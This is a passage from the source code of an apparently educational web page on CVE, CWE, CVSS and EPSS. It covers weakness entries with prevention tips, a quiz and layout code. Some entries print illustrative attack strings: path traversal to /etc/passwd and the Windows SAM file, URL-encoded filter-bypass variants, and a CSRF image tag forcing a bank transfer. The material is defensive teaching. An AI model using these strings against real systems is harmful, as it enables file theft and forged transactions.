    category: "Memory",
    rank: 6,
    description: "Referencing memory after it has been freed leading to corruption or RCE",
    realWorldExample: "Browser exploitation via UAF in DOM object handling, kernel UAF for privilege escalation",
    preventionTechniques: [
      "Set pointers to NULL after free() to detect double-free",
      "Use smart pointers in C++ (unique_ptr, shared_ptr) for automatic memory management",
      "Reference counting to track object lifetimes",
      "Memory-safe languages (Rust ownership model prevents UAF at compile time)",
      "AddressSanitizer (ASan) and Valgrind for testing",
      "Fuzzing with AFL++, libFuzzer to discover UAF conditions"
    ],
    beginnerTips: [
      "**Use-after-free is one of the most dangerous memory bugs:** After calling free(ptr), that memory is available for reuse by other allocations. If code later dereferences ptr, it's accessing memory that might now contain different data - possibly attacker-controlled data. Example: free a User object, attacker triggers allocation of an Image object in the same memory, then code calls user->isAdmin() - but now it's reading the Image object's data, which attacker controls.",
      "**Why setting pointers to NULL helps:** After free(ptr), immediately do ptr = NULL. Later code that dereferences ptr will crash immediately (NULL dereference) rather than silently corrupting memory or executing attacker code. Crashes are better than silent corruption because they're detectable during testing. However, this doesn't prevent UAF if there are multiple pointers to the same object (dangling pointers).",
      "**Rust prevents use-after-free at compile time:** Rust's ownership system ensures only one owner of memory exists at a time. When the owner goes out of scope, memory is freed. The compiler tracks all references and ensures no references outlive the owned data. If you try to use a freed value, it's a compile error, not a runtime bug. This is why Rust is increasingly used for security-critical code (Firefox components, Linux kernel modules).",
      "**UAF is common in complex applications:** Browsers (Chrome, Firefox) have had hundreds of UAF vulnerabilities because they manage thousands of DOM objects with complex lifetimes. Operating system kernels (Windows, Linux) have UAF bugs in drivers and subsystems. Any application that manually manages memory with complex object lifetimes is susceptible. Modern mitigations like quarantine (delay freeing memory) make exploitation harder but don't eliminate the bug."
    ]
  },
  {
    id: "CWE-22",
    name: "Path Traversal",
    category: "File System",
    rank: 7,
    description: "Improper limitation of pathname to restricted directory",
    realWorldExample: "../../../../etc/passwd access via file download parameter, ..\\..\\Windows\\System32\\config\\SAM",
    preventionTechniques: [
      "Canonicalize paths and validate against allowlist of permitted directories",
      "Use chroot jails or containerization to restrict filesystem access",
      "Reject paths containing ../ or ..\\ sequences",
      "Use language path joining functions (os.path.join, Path.Combine) that normalize paths",
      "Implement access control lists (ACLs) at filesystem level",
      "Never directly concatenate user input with file paths"
    ],
    beginnerTips: [
      "**The classic attack: ../../../etc/passwd:** If code does `open('/var/www/files/' + userInput)` and user provides `../../../../etc/passwd`, the path becomes `/var/www/files/../../../../etc/passwd` which resolves to `/etc/passwd`. Each ../ means 'go up one directory'. Attackers can read any file the application has permission to access - config files with passwords, source code, system files.",
      "**Blocklisting ../ doesn't work:** Attackers bypass filters with encodings: ..%2F (URL encoded), ..%252F (double encoded), ..\\u002e\\u002e\\u002f (Unicode), ....// (extra dots), ..\\/ (mixed slashes). Or they use absolute paths: /etc/passwd. The solution: (1) Canonicalize the path (convert to absolute normalized form), (2) Verify the canonical path starts with your intended base directory. Use realpath() or Path.GetFullPath(), then check with startsWith().",
      "**Why canonicalization matters:** Given input `files/../../etc/passwd`, calling `os.path.realpath('/var/www/' + input)` returns `/etc/passwd`. You can then check `if not realpath.startswith('/var/www/files/')` and reject. Canonicalization handles symbolic links too - if attacker creates a symlink in files/ pointing to /etc/, canonicalization reveals the true path. Always canonicalize before checking.",
      "**Defense in depth: run with minimal permissions:** Even if path traversal exists, if your web server runs as user 'www-data' with no access to /etc/shadow, attackers can't read it. Principle of least privilege: applications should run with only the file system permissions they need. Don't run web servers as root. Use containers (Docker) or chroot jails to restrict file system access to only the necessary directories."
    ]
  },
  {
    id: "CWE-352",
    name: "Cross-Site Request Forgery (CSRF)",
    category: "Auth",
    rank: 8,
    description: "Web application does not verify request was intentionally sent by authenticated user",
    realWorldExample: "<img src='http://bank.com/transfer?to=attacker&amount=1000'> in email forcing money transfer",
    preventionTechniques: [
      "Anti-CSRF tokens (synchronizer token pattern) unique per session",
      "SameSite cookie attribute (Strict or Lax) to prevent cross-site cookie sending",
      "Double-submit cookie pattern comparing cookie value with form field",
      "Verify Origin and Referer headers match expected domain",
      "Require re-authentication for sensitive operations",
      "Use custom request headers (X-Requested-With) that CORS won't auto-send"
    ],
    beginnerTips: [
      "**CSRF attacks are about unwanted actions, not data theft:** The attacker can't read the response due to Same-Origin Policy, but they can make the victim's browser send authenticated requests. Example: You're logged into bank.com. You visit evil.com which contains `<img src='http://bank.com/transfer?to=attacker&amount=5000'>`. Your browser automatically sends your bank.com cookies with this request, and the transfer executes. The attacker never sees your account, but successfully transferred money.",
      "**Why CSRF tokens work:** When rendering a form, the server includes a random token `<input type='hidden' name='csrf_token' value='abc123'>` that's also stored in the session. On submission, server verifies the token matches the session. The attacker's evil.com can make the victim's browser send requests to bank.com, but the attacker doesn't know the victim's csrf_token (can't read it due to Same-Origin Policy), so requests fail. Tokens must be unpredictable and tied to sessions.",
      "**SameSite cookies are the modern defense:** Setting cookies with `SameSite=Strict` means browsers won't send them with cross-site requests. If bank.com sets `SameSite=Strict` on session cookies, requests from evil.com won't include the cookie, so they're unauthenticated and fail. SameSite=Lax allows cookies for top-level navigations (clicking links) but not for subrequests (img, form, fetch). Most apps should use Lax. SameSite is now default in Chrome and Firefox.",
      "**GET requests should never modify state:** CSRF is easier with GET requests because `<img src='...'>` automatically makes GET requests. If your app does `/delete-account?id=123` as GET, a single image tag can delete accounts. GET should be idempotent (read-only). Use POST for state changes. This doesn't prevent CSRF (attackers can make POST requests too) but limits attack surface and follows HTTP semantics. Always combine with CSRF tokens or SameSite."
    ]
  },
  {
    id: "CWE-287",
    name: "Improper Authentication",
    category: "Auth",
    rank: 9,
    description: "Actor claims identity but evidence is not validated or is weakly validated",
    realWorldExample: "JWT signature verification bypass, authentication bypass via null byte, missing authentication checks",
    preventionTechniques: [
      "Use established authentication frameworks (OAuth 2.0, SAML, OpenID Connect)",
      "Implement multi-factor authentication (MFA) for all accounts",
      "Verify JWT signatures using proper libraries (never decode without verification)",
      "Session tokens should be cryptographically random (not predictable)",
      "Implement account lockout after failed login attempts",
      "Use bcrypt/scrypt/argon2 for password hashing (never MD5/SHA1)"
    ]
  },
  {
    id: "CWE-476",
    name: "NULL Pointer Dereference",
    category: "Memory",
    rank: 10,
    description: "Application dereferences pointer expected to be valid but is NULL",
    realWorldExample: "Kernel panic from NULL pointer dereference in driver code, segmentation fault in application",
    preventionTechniques: [
      "Always check return values from functions that can return NULL",
      "Initialize pointers to NULL and check before use",
      "Use Option<T> or Maybe<T> types in languages that support them",
      "Static analysis tools (Coverity, Clang Static Analyzer) to detect NULL dereferences",
      "Defensive programming with assertions and error handling",
      "Unit tests with NULL inputs to verify handling"
    ]
  },
  {
    id: "CWE-502",
    name: "Deserialization of Untrusted Data",
    category: "Injection",
    rank: 11,
    description: "Deserializing untrusted data without proper verification leading to RCE",
    realWorldExample: "Java deserialization gadget chains for RCE, Python pickle exploitation, PHP unserialize() RCE",
    preventionTechniques: [
      "Avoid deserializing untrusted data entirely if possible",
      "Use data-only formats (JSON, XML) instead of object serialization",
      "Implement allowlist of permitted classes for deserialization",
      "Sign serialized data and verify signature before deserialization",
      "Use secure serialization libraries with integrity checks",
      "Run deserialization in sandboxed environment with limited privileges"
    ],
    beginnerTips: [
      "**Deserialization turns data into objects - and objects can execute code:** Serialization converts objects to bytes for storage/transmission. Deserialization recreates objects from bytes. The danger: many serialization formats (Java, Python pickle, PHP serialize) preserve object types and can trigger code execution during deserialization. Attackers craft malicious serialized data that, when deserialized, executes arbitrary code. This is like SQL injection but for object instantiation.",
      "**Java deserialization is particularly dangerous:** Java serialization can invoke magic methods (readObject, readResolve, etc.) during deserialization. Attackers chain together \"gadgets\" - classes already in your application's classpath that have exploitable magic methods. The ysoserial tool has dozens of pre-built gadget chains for popular libraries (Apache Commons, Spring, etc.). If your app deserializes untrusted data, attackers can achieve RCE without writing any code - just by using classes you already have.",
      "**Use JSON instead of native serialization:** JSON is data-only - it doesn't encode object types or methods. When you deserialize JSON, you explicitly specify what classes to create (e.g., json.loads() in Python returns dicts/lists/primitives, not arbitrary objects). This is much safer than pickle.loads() which reconstructs whatever objects were serialized. For APIs and data exchange, use JSON, Protocol Buffers, or MessagePack - not language-native serialization.",
      "**If you must deserialize untrusted data, use allowlisting:** Java's ObjectInputStream has a setObjectInputFilter() method to allowlist permitted classes. Only these classes can be deserialized; everything else is rejected. This prevents gadget chain attacks because attackers can't instantiate the dangerous utility classes they need. However, if any allowlisted class has dangerous methods, you're still vulnerable. Best practice: don't deserialize untrusted data at all."
    ]
  },
  {
    id: "CWE-190",
    name: "Integer Overflow",
    category: "Numeric",
    rank: 12,
    description: "Calculation produces integer overflow or wraparound leading to buffer overflow or logic errors",
    realWorldExample: "malloc(user_size * sizeof(struct)) overflow allows small allocation then buffer overflow",
    preventionTechniques: [
      "Use safe integer arithmetic libraries that check for overflow",
      "Validate integer ranges before arithmetic operations",
      "Use larger integer types to prevent overflow (int64 instead of int32)",
      "Compiler flags for runtime overflow detection (-ftrapv, UBSan)",
      "Check for overflow conditions: if (a + b < a) overflow_detected()",
      "Use languages with overflow checking built-in (Rust, Swift)"
    ]
  },
];

// Quiz questions
const quizQuestions: QuizQuestion[] = [
  {
    id: 1,
    question: "What does CVE stand for and what is its purpose?",
    options: [
      "Common Vulnerability Enumeration - A ranking system for vulnerability severity",
      "Common Vulnerabilities and Exposures - A unique identifier system for publicly disclosed vulnerabilities",
      "Critical Vulnerability Exposure - A database of zero-day exploits",
      "Cyber Vulnerability Engine - An automated scanning tool"
    ],
    correctAnswer: 1,
    explanation: "CVE stands for Common Vulnerabilities and Exposures. It provides unique identifiers for publicly disclosed cybersecurity vulnerabilities, allowing organizations to share information using common terminology. CVEs do not rate severity (that's CVSS) or track exploitation (that's EPSS/KEV)."
  },
  {
    id: 2,
    question: "A vulnerability has CVSS 9.8 (Critical) but EPSS 0.02 (2%). How should you prioritize it?",
    options: [
      "Emergency patching required immediately due to critical CVSS score",
      "Lower priority - EPSS indicates unlikely exploitation despite high severity",
      "Ignore it completely since EPSS is very low",
      "Wait for active exploitation before considering it"
    ],
    correctAnswer: 1,
    explanation: "This demonstrates the difference between severity (CVSS) and exploitability (EPSS). While high severity indicates significant impact IF exploited, low EPSS suggests exploitation is unlikely. Prioritize based on asset criticality and exposure, but don't treat it as urgent as high CVSS + high EPSS vulnerabilities. Schedule in standard patch cycle with monitoring for EPSS changes."
  },
  {
    id: 3,
    question: "What is the main difference between CVE and CWE?",
    options: [
      "CVE is for web vulnerabilities, CWE is for system vulnerabilities",
      "CVE identifies specific vulnerability instances, CWE categorizes types of weaknesses",
      "CVE is maintained by NIST, CWE is maintained by OWASP",
      "CVE is for software, CWE is for hardware"
    ],
    correctAnswer: 1,
    explanation: "CVE identifies specific vulnerability instances (e.g., CVE-2021-44228 for Log4Shell), while CWE categorizes types of weaknesses (e.g., CWE-89 for all SQL Injection vulnerabilities). Many CVEs can map to the same CWE. This helps organizations identify recurring weakness patterns in their code."
  },
  {
    id: 4,
    question: "What does the CVSS vector CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H indicate?",
    options: [
      "Local vulnerability requiring admin privileges with low impact",
      "Network-accessible vulnerability with no prerequisites and high impact to confidentiality, integrity, and availability",
      "Physical access required vulnerability with user interaction needed",
      "Adjacent network vulnerability with high complexity"
    ],
    correctAnswer: 1,
    explanation: "This vector indicates: Attack Vector Network (AV:N), Attack Complexity Low (AC:L), Privileges Required None (PR:N), User Interaction None (UI:N), Scope Unchanged (S:U), with High impact to Confidentiality (C:H), Integrity (I:H), and Availability (A:H). This typically scores 9.8-10.0 Critical and represents the most exploitable and dangerous vulnerability type."
  },
  {
    id: 5,
    question: "What is CISA's Known Exploited Vulnerabilities (KEV) catalog used for?",
    options: [
      "A comprehensive list of all CVEs ever published",
      "A curated subset of CVEs with evidence of active exploitation in the wild",
      "A scoring system replacing CVSS",
      "A database of theoretical attack vectors"
    ],
    correctAnswer: 1,
    explanation: "KEV is CISA's catalog of vulnerabilities that have been actively exploited in the wild. It's a curated subset of CVEs prioritized based on observed real-world attacks. Federal agencies are required to patch KEV entries within specified timelines. Combining KEV with EPSS and CVSS provides comprehensive vulnerability prioritization: KEV = known exploitation, EPSS = likelihood of exploitation, CVSS = severity if exploited."
  },
  {
    id: 6,
    question: "Why is tracking CWE patterns important for development teams?",
    options: [
      "It provides CVE identifiers for bug reports",
      "It helps identify recurring weakness types for targeted remediation and training",
      "It replaces the need for security code reviews",
      "It automatically generates patches for vulnerabilities"
    ],
    correctAnswer: 1,
    explanation: "Tracking CWE patterns helps identify systemic weaknesses in coding practices. If multiple CVEs in your codebase map to the same CWE (e.g., CWE-89 SQL Injection), it signals a need for targeted secure coding training, architectural controls, or SAST rules for that weakness type. This shifts focus from individual bugs to root cause patterns."
  },
  {
    id: 7,
    question: "What is the correct order for vulnerability triage using multiple scoring systems?",
    options: [
      "CVSS only - patch highest scores first",
      "EPSS only - patch most likely to be exploited first",
      "KEV first, then High CVSS + High EPSS, then High CVSS alone, then standard cycle for rest",
      "Random order based on available resources"
    ],
    correctAnswer: 2,
    explanation: "Effective triage combines multiple signals: 1) KEV entries (confirmed exploitation) get emergency priority. 2) High CVSS + High EPSS (severe AND likely) get fast-tracked. 3) High CVSS + Low EPSS schedule in near-term cycle. 4) Low CVSS + High EPSS validate exploitability/exposure. 5) Low CVSS + Low EPSS backlog with monitoring. Also factor in asset criticality, internet exposure, and compensating controls."
  },
  {
    id: 8,
    question: "What is the relationship between CWE and CAPEC?",
    options: [
      "They are the same thing with different names",
      "CWE describes software weaknesses, CAPEC describes attack patterns that exploit those weaknesses",
      "CAPEC is the scoring system for CWE",
      "CWE is for web apps, CAPEC is for networks"
    ],
    correctAnswer: 1,
    explanation: "CWE (Common Weakness Enumeration) describes software weaknesses/root causes (e.g., CWE-89: SQL Injection), while CAPEC (Common Attack Pattern Enumeration and Classification) describes attacker techniques and patterns that exploit those weaknesses (e.g., CAPEC-66: SQL Injection through SOAP Parameter Tampering). Together, they connect defensive and offensive perspectives for comprehensive security."
  }
];

// Navigation items
const navigationItems = [
  { id: "intro", label: "Introduction", icon: <InfoIcon /> },
  { id: "cve", label: "CVE System", icon: <SecurityIcon /> },
  { id: "cwe", label: "CWE Categories", icon: <CategoryIcon /> },
  { id: "cvss", label: "CVSS Scoring", icon: <AssessmentIcon /> },
  { id: "epss", label: "EPSS Prediction", icon: <TrendingUpIcon /> },
  { id: "famous-cves", label: "Famous CVEs", icon: <LocalFireDepartmentIcon /> },
  { id: "top-cwes", label: "Top 25 CWEs", icon: <BugReportIcon /> },
  { id: "prioritization", label: "Prioritization", icon: <PriorityHighIcon /> },
  { id: "workflow", label: "Response Workflow", icon: <TimelineIcon /> },
  { id: "quiz", label: "Knowledge Check", icon: <QuizIcon /> },
];

export default function CveCweCvssPage() {
  const theme = useTheme();
  const navigate = useNavigate();
  const isMobile = useMediaQuery(theme.breakpoints.down("md"));
  const [activeSection, setActiveSection] = useState("intro");
  const [scrollProgress, setScrollProgress] = useState(0);
  const [mobileNavOpen, setMobileNavOpen] = useState(false);
  const [cvssScore, setCvssScore] = useState(7.5);

  const pageContext = `Complete guide to CVE (Common Vulnerabilities and Exposures), CWE (Common Weakness Enumeration), CVSS (Common Vulnerability Scoring System), and EPSS (Exploit Prediction Scoring System). Learn vulnerability identification, classification, severity scoring, and exploitation likelihood prediction. Includes famous CVEs (Log4Shell, Heartbleed, EternalBlue), top 25 CWEs with prevention techniques, CVSS vector interpretation, EPSS-based prioritization, KEV catalog integration, and response workflows. Essential knowledge for security engineers, vulnerability management, and incident response. Current section: ${activeSection}. CVSS calculator: ${cvssScore.toFixed(1)}.`;

  // Scroll tracking
  useEffect(() => {
    const handleScroll = () => {
      const totalHeight = document.documentElement.scrollHeight - window.innerHeight;
      const progress = (window.scrollY / totalHeight) * 100;
      setScrollProgress(progress);

      // Update active section
      const sections = navigationItems.map(item => document.getElementById(item.id));
      for (let i = sections.length - 1; i >= 0; i--) {
        const section = sections[i];
        if (section) {
          const rect = section.getBoundingClientRect();
          if (rect.top <= 150) {
            setActiveSection(navigationItems[i].id);
            break;
          }
        }
      }
    };

    window.addEventListener("scroll", handleScroll);
    return () => window.removeEventListener("scroll", handleScroll);
  }, []);

  const scrollToSection = (id: string) => {
    const element = document.getElementById(id);
    if (element) {
      const offset = 80;
      const elementPosition = element.getBoundingClientRect().top + window.scrollY;
      window.scrollTo({ top: elementPosition - offset, behavior: "smooth" });
    }
    setMobileNavOpen(false);
  };

  const getCVSSSeverity = (score: number) => {
    if (score === 0) return { label: "None", color: "#6b7280" };
    if (score < 4) return { label: "Low", color: "#22c55e" };
    if (score < 7) return { label: "Medium", color: "#f59e0b" };
    if (score < 9) return { label: "High", color: "#ef4444" };
    return { label: "Critical", color: "#dc2626" };
  };

  const severity = getCVSSSeverity(cvssScore);

  // Sidebar Navigation Component
  const SidebarNavigation = () => (
    <Box
      sx={{
        position: "sticky",
        top: 80,
        width: 240,
        flexShrink: 0,
        display: { xs: "none", md: "block" },
      }}
    >
      <Paper sx={{ p: 2, borderRadius: 2 }}>
        <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 2 }}>
          <ListAltIcon sx={{ color: ACCENT_COLOR }} />
          <Typography variant="subtitle2" fontWeight="bold">
            Contents
          </Typography>
        </Box>
        <LinearProgress
          variant="determinate"
          value={scrollProgress}
          sx={{
            mb: 2,
            height: 4,
            borderRadius: 2,
            bgcolor: alpha(ACCENT_COLOR, 0.1),
            "& .MuiLinearProgress-bar": { bgcolor: ACCENT_COLOR },
          }}
        />
        <List dense>
          {navigationItems.map((item) => (
            <ListItem
              key={item.id}
              component="button"
              onClick={() => scrollToSection(item.id)}
              sx={{
                borderRadius: 1,
                mb: 0.5,
                bgcolor: activeSection === item.id ? alpha(ACCENT_COLOR, 0.1) : "transparent",
                border: "none",
                cursor: "pointer",
                width: "100%",
                textAlign: "left",
                "&:hover": { bgcolor: alpha(ACCENT_COLOR, 0.05) },
              }}
            >
              <ListItemIcon sx={{ minWidth: 32, color: activeSection === item.id ? ACCENT_COLOR : "text.secondary" }}>
                {item.icon}
              </ListItemIcon>
              <ListItemText
                primary={item.label}
                primaryTypographyProps={{
                  variant: "body2",
                  fontWeight: activeSection === item.id ? "bold" : "normal",
                  color: activeSection === item.id ? ACCENT_COLOR : "text.primary",
                }}
              />
            </ListItem>
          ))}
        </List>
      </Paper>
    </Box>
  );

  return (
    <LearnPageLayout pageTitle="CVE, CWE, CVSS & EPSS Reference" pageContext={pageContext}>
      <Box sx={{ p: 3, display: "flex", gap: 3 }}>
        {/* Sidebar Navigation */}
        <SidebarNavigation />

        {/* Mobile Navigation FAB */}
        {isMobile && (
          <Fab
            size="small"
            onClick={() => setMobileNavOpen(true)}
            sx={{
              position: "fixed",
              bottom: 80,
              right: 16,
              bgcolor: ACCENT_COLOR,
              "&:hover": { bgcolor: alpha(ACCENT_COLOR, 0.8) },
            }}
          >
            <ListAltIcon />
          </Fab>
        )}

        {/* Scroll to Top FAB */}
        {isMobile && scrollProgress > 20 && (
          <Fab
            size="small"
            onClick={() => window.scrollTo({ top: 0, behavior: "smooth" })}
            sx={{
              position: "fixed",
              bottom: 140,
              right: 16,
              bgcolor: alpha(ACCENT_COLOR, 0.8),
            }}
          >
            <KeyboardArrowUpIcon />
          </Fab>
        )}

        {/* Mobile Navigation Drawer */}
        <Drawer
          anchor="right"
          open={mobileNavOpen}
          onClose={() => setMobileNavOpen(false)}
        >
          <Box sx={{ width: 280, p: 2 }}>
            <Box sx={{ display: "flex", alignItems: "center", justifyContent: "space-between", mb: 2 }}>
              <Typography variant="h6">Contents</Typography>
              <IconButton onClick={() => setMobileNavOpen(false)}>
                <CloseIcon />
              </IconButton>
            </Box>
            <List>
              {navigationItems.map((item) => (
                <ListItem
                  key={item.id}
                  component="button"
                  onClick={() => scrollToSection(item.id)}
                  sx={{
                    borderRadius: 1,
                    mb: 0.5,
                    bgcolor: activeSection === item.id ? alpha(ACCENT_COLOR, 0.1) : "transparent",
                    border: "none",
                    cursor: "pointer",
                    width: "100%",
                    textAlign: "left",
                  }}
                >
                  <ListItemIcon sx={{ color: activeSection === item.id ? ACCENT_COLOR : "text.secondary" }}>
                    {item.icon}
                  </ListItemIcon>
                  <ListItemText primary={item.label} />
                </ListItem>
              ))}
            </List>
          </Box>
        </Drawer>

        {/* Main Content */}
        <Box sx={{ flex: 1, minWidth: 0 }}>
          {/* Back Link */}
          <Box sx={{ mb: 3 }} id="intro">
            <Chip
              component={Link}
              to="/learn"
              icon={<ArrowBackIcon />}
              label="Back to Learning Hub"
              clickable
              variant="outlined"
              sx={{ borderRadius: 2 }}
            />
          </Box>

          {/* Header */}
          <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 3 }}>
            <SecurityIcon sx={{ fontSize: 40, color: ACCENT_COLOR }} />
            <Box>
              <Typography variant="h4" sx={{ fontWeight: "bold" }}>
                CVE, CWE, CVSS & EPSS Reference Guide
              </Typography>
              <Typography variant="body2" color="text.secondary">
                Master vulnerability identification, classification, severity scoring, and exploitation prediction
              </Typography>
            </Box>
          </Box>

          {/* Introduction */}
          <Paper sx={{ p: 3, mb: 3, bgcolor: alpha(ACCENT_COLOR, 0.05) }}>
            <Typography variant="h6" gutterBottom sx={{ fontWeight: "bold" }}>
              Understanding the Vulnerability Ecosystem
            </Typography>
            <Typography variant="body1" paragraph>
              Vulnerability management relies on four interconnected systems: <strong>CVE</strong> provides unique identifiers for specific vulnerabilities, <strong>CWE</strong> categorizes types of weaknesses, <strong>CVSS</strong> scores severity based on technical characteristics, and <strong>EPSS</strong> predicts exploitation likelihood using machine learning.
            </Typography>
            <Grid container spacing={2}>
              {[
                { name: "CVE", desc: "What: Unique ID for specific vulnerabilities", example: "CVE-2021-44228", color: "#3b82f6" },
                { name: "CWE", desc: "Why: Root cause weakness category", example: "CWE-89 (SQL Injection)", color: "#8b5cf6" },
                { name: "CVSS", desc: "How Bad: Severity score 0-10", example: "9.8 Critical", color: "#ef4444" },
                { name: "EPSS", desc: "How Likely: Exploitation probability", example: "97.6% exploited", color: "#10b981" },
              ].map((item) => (
                <Grid item xs={12} sm={6} key={item.name}>
                  <Card sx={{ height: "100%", border: `1px solid ${alpha(item.color, 0.2)}` }}>
                    <CardContent>
                      <Typography variant="h6" sx={{ fontWeight: "bold", color: item.color, mb: 1 }}>
                        {item.name}
                      </Typography>
                      <Typography variant="body2" color="text.secondary" sx={{ mb: 1 }}>
                        {item.desc}
                      </Typography>
                      <Chip label={item.example} size="small" sx={{ bgcolor: alpha(item.color, 0.1), color: item.color }} />
                    </CardContent>
                  </Card>
                </Grid>
              ))}
            </Grid>
          </Paper>

          {/* CVE Section */}
          <Box id="cve" sx={{ mb: 4 }}>
            <Typography variant="h5" gutterBottom sx={{ fontWeight: "bold", display: "flex", alignItems: "center", gap: 1 }}>
              <SecurityIcon color="primary" />
              CVE: Common Vulnerabilities and Exposures
            </Typography>
            <Paper sx={{ p: 3, mb: 2 }}>
              <Typography variant="body1" paragraph>
                <strong>CVE</strong> is a standardized identifier for publicly disclosed cybersecurity vulnerabilities. Each CVE entry contains an identification number, description, and references. The system enables organizations to share information about vulnerabilities using common terminology across vendors, tools, and databases.
              </Typography>
              <Alert severity="info" sx={{ mb: 2 }}>
                <AlertTitle>Key Point</AlertTitle>
                A CVE is NOT a severity rating or a patch - it's simply a label that lets different teams refer to the same issue without ambiguity. Severity comes from CVSS, exploitation likelihood from EPSS, and fixes come from vendor advisories.
              </Alert>
              <Grid container spacing={2}>
                <Grid item xs={12} md={6}>
                  <Paper sx={{ p: 2, bgcolor: alpha("#3b82f6", 0.05) }}>
                    <Typography variant="subtitle1" sx={{ fontWeight: "bold", mb: 1 }}>CVE ID Format</Typography>
                    <Box sx={{ fontFamily: "monospace", fontSize: "1.1rem", bgcolor: alpha("#3b82f6", 0.1), p: 2, borderRadius: 1, mb: 2 }}>
                      CVE-<span style={{ color: "#3b82f6" }}>2021</span>-<span style={{ color: "#8b5cf6" }}>44228</span>
                    </Box>
                    <Typography variant="body2" color="text.secondary">
                      <strong style={{ color: "#3b82f6" }}>Year</strong>: When ID was assigned (not disclosure year)<br />
                      <strong style={{ color: "#8b5cf6" }}>Sequence</strong>: 4-7 digit unique number
                    </Typography>
                  </Paper>
                </Grid>
                <Grid item xs={12} md={6}>
                  <Paper sx={{ p: 2, bgcolor: alpha("#10b981", 0.05) }}>
                    <Typography variant="subtitle1" sx={{ fontWeight: "bold", mb: 1 }}>CVE Lifecycle</Typography>
                    <List dense>
                      <ListItem>
                        <ListItemIcon><CheckCircleIcon sx={{ color: "#10b981", fontSize: 20 }} /></ListItemIcon>
                        <ListItemText primary="Reserve" secondary="CNA reserves ID during disclosure" />
                      </ListItem>
                      <ListItem>
                        <ListItemIcon><CheckCircleIcon sx={{ color: "#10b981", fontSize: 20 }} /></ListItemIcon>
                        <ListItemText primary="Publish" secondary="Record populated with description" />
                      </ListItem>
                      <ListItem>
                        <ListItemIcon><CheckCircleIcon sx={{ color: "#10b981", fontSize: 20 }} /></ListItemIcon>
                        <ListItemText primary="Enrich" secondary="NVD adds CVSS and CWE mapping" />
                      </ListItem>
                    </List>
                  </Paper>
                </Grid>
              </Grid>
            </Paper>
          </Box>

          {/* CWE Section */}
          <Box id="cwe" sx={{ mb: 4 }}>
            <Typography variant="h5" gutterBottom sx={{ fontWeight: "bold", display: "flex", alignItems: "center", gap: 1 }}>
              <CategoryIcon color="primary" />
              CWE: Common Weakness Enumeration
            </Typography>
            <Paper sx={{ p: 3, mb: 2 }}>
              <Typography variant="body1" paragraph>
                <strong>CWE</strong> is a category system for software security weaknesses. Unlike CVE (specific instances), CWE describes types of vulnerabilities. For example, CWE-89 covers ALL SQL Injection vulnerabilities, while CVE-2023-12345 might identify a specific SQL Injection in a specific product.
              </Typography>
              <Alert severity="warning" sx={{ mb: 2 }}>
                <AlertTitle>CVE vs CWE</AlertTitle>
                A CVE is a specific vulnerability instance. A CWE is a category of vulnerability type. Many CVEs can map to the same CWE. When you see repeated CVEs mapping to the same CWE, it signals systemic coding weaknesses requiring targeted remediation.
              </Alert>
              <Grid container spacing={2}>
                <Grid item xs={12}>
                  <Paper sx={{ p: 2, bgcolor: alpha("#8b5cf6", 0.05) }}>
                    <Typography variant="subtitle1" sx={{ fontWeight: "bold", mb: 2 }}>CWE Hierarchy</Typography>
                    <Grid container spacing={2}>
                      <Grid item xs={12} md={4}>
                        <Box sx={{ p: 2, borderRadius: 1, border: `1px solid ${alpha("#8b5cf6", 0.2)}` }}>
                          <Typography variant="subtitle2" sx={{ fontWeight: "bold", color: "#8b5cf6", mb: 1 }}>Views</Typography>
                          <Typography variant="body2" color="text.secondary">
                            Different perspectives (OWASP Top 10, CWE Top 25, SANS 25)
                          </Typography>
                        </Box>
                      </Grid>
                      <Grid item xs={12} md={4}>
                        <Box sx={{ p: 2, borderRadius: 1, border: `1px solid ${alpha("#8b5cf6", 0.2)}` }}>
                          <Typography variant="subtitle2" sx={{ fontWeight: "bold", color: "#8b5cf6", mb: 1 }}>Categories</Typography>
                          <Typography variant="body2" color="text.secondary">
                            Groupings of related weaknesses (Injection, Auth, Memory)
                          </Typography>
                        </Box>
                      </Grid>
                      <Grid item xs={12} md={4}>
                        <Box sx={{ p: 2, borderRadius: 1, border: `1px solid ${alpha("#8b5cf6", 0.2)}` }}>
                          <Typography variant="subtitle2" sx={{ fontWeight: "bold", color: "#8b5cf6", mb: 1 }}>Weaknesses</Typography>
                          <Typography variant="body2" color="text.secondary">
                            Individual weakness types (Base, Variant, Composite)
                          </Typography>
                        </Box>
                      </Grid>
                    </Grid>
                  </Paper>
                </Grid>
                <Grid item xs={12}>
                  <Paper sx={{ p: 2, bgcolor: alpha("#10b981", 0.05) }}>
                    <Typography variant="subtitle1" sx={{ fontWeight: "bold", mb: 1 }}>Using CWE in Remediation</Typography>
                    <List dense>
                      <ListItem>
                        <ListItemIcon><CheckCircleIcon sx={{ color: "#10b981", fontSize: 20 }} /></ListItemIcon>
                        <ListItemText primary="Map recurring CWEs to secure coding training and reviews" />
                      </ListItem>
                      <ListItem>
                        <ListItemIcon><CheckCircleIcon sx={{ color: "#10b981", fontSize: 20 }} /></ListItemIcon>
                        <ListItemText primary="Use CWE Top 25 as baseline checklist for new services" />
                      </ListItem>
                      <ListItem>
                        <ListItemIcon><CheckCircleIcon sx={{ color: "#10b981", fontSize: 20 }} /></ListItemIcon>
                        <ListItemText primary="Tag bugs with CWE to track root-cause trends over time" />
                      </ListItem>
                      <ListItem>
                        <ListItemIcon><CheckCircleIcon sx={{ color: "#10b981", fontSize: 20 }} /></ListItemIcon>
                        <ListItemText primary="Use CWE mapping to select SAST rules and defensive tests" />
                      </ListItem>
                    </List>
                  </Paper>
                </Grid>
              </Grid>
            </Paper>
          </Box>

          {/* CVSS Section */}
          <Box id="cvss" sx={{ mb: 4 }}>
            <Typography variant="h5" gutterBottom sx={{ fontWeight: "bold", display: "flex", alignItems: "center", gap: 1 }}>
              <AssessmentIcon color="primary" />
              CVSS: Common Vulnerability Scoring System
            </Typography>
            <Paper sx={{ p: 3, mb: 2 }}>
              <Typography variant="body1" paragraph>
                <strong>CVSS</strong> is a standardized framework for rating vulnerability severity from 0.0 (None) to 10.0 (Critical). It measures technical impact and exploit conditions, but NOT business risk. A high CVSS score can still be low priority if the vulnerable feature is disabled, isolated, or mitigated by controls.
              </Typography>
              <Grid container spacing={2}>
                <Grid item xs={12} md={8}>
                  <Paper sx={{ p: 2, bgcolor: alpha("#3b82f6", 0.05) }}>
